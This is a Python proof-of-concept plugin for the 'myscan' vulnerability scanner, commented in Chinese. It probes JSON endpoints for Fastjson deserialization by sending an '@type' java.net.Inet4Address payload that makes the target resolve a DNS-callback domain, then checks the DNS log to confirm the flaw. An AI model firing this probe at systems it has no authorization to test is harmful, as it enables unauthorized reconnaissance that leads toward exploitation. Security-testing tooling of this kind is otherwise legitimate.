#!/usr/bin/env python3
# @Time    : 2020-06-09
# @Author  : caicai
# @File    : others_fastjson_dnslog_found.py

from myscan.lib.parse.dictdata_parser import dictdata_parser  # 写了一些操作dictdata的方法的类
from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.lib.core.common import get_random_str
from myscan.lib.core.base import PocBase
from myscan.lib.core.common_reverse import generate, query_reverse


class POC(PocBase):
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        # scheme的poc不同perfoler和perfile,没有workdata没有data字段,所以无self.url
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "fastjson_dnslog_found"
        self.vulmsg = "可尝试反序列化payload"
        self.level = 1  # 0:Low  1:Medium 2:High

    def verify(self):
        if not self.dictdata.get("request").get("content_type") == 4:  # data数据类型为json
            return
        parse = dictdata_parser(self.dictdata)
        if not self.can_output(parse.getrootpath() + self.name):  # 限定只输出一次
            return

        payload_ = '''{"%(random_str)s": {"@type": "java.net.Inet4Address", "val": "%(domain)s"}}'''

        random_str = get_random_str(6).lower()
        _, domain_ = generate(parse.getfilepath(), "dns")
        payload = payload_ % {"random_str": random_str, "domain": domain_}

        req = parse.generaterequest({"data": payload})
        r = request(**req)
        if r is not None:
            res, res_data = query_reverse(domain_)
            if res:
                parser_ = response_parser(r)
                self.result.append({
                    "name": self.name,
                    "url": parser_.geturl(),
                    "level": self.level,  # 0:Low  1:Medium 2:High
                    "detail": {
                        "vulmsg": self.vulmsg,
                        "others": "{} in dnslog".format(domain_),
                        "request": parser_.getrequestraw(),
                        "response": parser_.getresponseraw()
                    }
                })
                self.can_output(parse.getrootpath() + self.name, True)
                return
